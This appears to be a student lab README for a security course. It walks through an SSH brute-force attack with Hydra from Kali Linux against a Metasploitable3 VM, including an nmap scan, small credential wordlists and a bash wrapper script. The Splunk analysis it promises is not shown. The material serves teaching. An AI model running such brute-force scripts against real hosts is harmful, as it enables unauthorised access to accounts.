
# ICS344 Project: SSH Brute Force Attack and Splunk SIEM Analysis

This project demonstrates a simulated SSH brute-force attack using Hydra from a Kali Linux machine against a vulnerable Metasploitable3 VM. In **Phase 1**, we set up the environment and executed the attack. In **Phase 2**, we analyzed the attack using Splunk as a Security Information and Event Management (SIEM) tool.

---

## Phase 1: SSH Brute Force via Script Method

### 1. Environment Setup

We set up the following machines in VirtualBox:

- **Kali Linux** (Attacker)
- **Metasploitable3** (Victim)

#### Virtual Network Configuration

Both machines were configured with:

- Adapter 1: NAT (for internet access)
- Adapter 2: Host-Only Adapter (for internal communication between VMs)

---

### 2. Check VM Communication

We confirmed the network connectivity between the attacker and victim machines.

- On **Kali Linux**, we ran:

```bash
ifconfig
```

- On **Metasploitable3**, we ran:

```bash
ifconfig
```

![Attacker and Victim IPs](screanshots/1.png)

- Kali Linux IP: `192.168.56.107`
- Metasploitable3 IP: `192.168.56.106`

We then ensured they could communicate with each other using `ping`.

---

### 3. Discover Open Ports on the Victim

From Kali Linux, we scanned the victim machine:

```bash
sudo nmap -sS -sV 192.168.56.106
```

![Nmap scan results showing open ports](screanshots/3.png)

Discovered services:
- FTP (21)
- SSH (22)
- HTTP (80)
- MySQL (3306)
- Jetty (8080)
- and others...

---

### 4. Prepare Brute Force Files

We created a directory for the brute-force attack:

```bash
mkdir ssh-brute
cd ssh-brute
```

**users.txt**:
```
pgsql
admin
root
user
vagrant
aisha
test
```

**pass.txt**:
```
nginx
password
123456
toor
vagrant
aishapass
testpass
```

**script.sh**:
```bash
#!/bin/bash

TARGET_IP="192.168.56.106"
TARGET_PORT=22
USER_LIST="users.txt"
PASSWORD_LIST="pass.txt"
OUTPUT_FILE="valid_credentials.txt"

if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it and try again."
    exit 1
fi

echo "Starting brute force attack with Hydra..."
hydra -L "$USER_LIST" -P "$PASSWORD_LIST" ssh://$TARGET_IP -s $TARGET_PORT -o $OUTPUT_FILE

if [ -s "$OUTPUT_FILE" ]; then
    echo "Brute force attack completed. Valid credentials found:"
    cat "$OUTPUT_FILE"
else
    echo "No valid credentials found."
fi
```

Make the script executable:

```bash
chmod +x script.sh
```

---

## Summary

| Role       | Machine            | IP Address       | Description                             |
|------------|--------------------|------------------|-----------------------------------------|
| Attacker   | Kali Linux         | 192.168.56.107   | Launches SSH brute-force attack         |
| Victim     | Metasploitable3    | 192.168.56.106   | Target of attack                        |

---

## Screenshots Folder

```
screenshots/
├── 1.png       # IP info of both VMs
├── 3.png       # Nmap scan results
```

---

## References

- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- ICS344 Lab Guide
